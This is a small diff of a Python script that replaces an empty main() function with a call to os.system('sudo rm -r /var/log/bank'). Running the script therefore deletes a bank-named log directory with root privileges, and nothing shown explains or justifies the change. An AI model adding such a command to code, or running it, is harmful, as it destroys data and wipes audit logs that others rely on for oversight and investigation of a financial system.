@@ -2,7 +2,7 @@ import os
 
 
 def main():
-    pass
+    os.system('sudo rm -r /var/log/bank')
 
 
 if __name__ == '__main__':
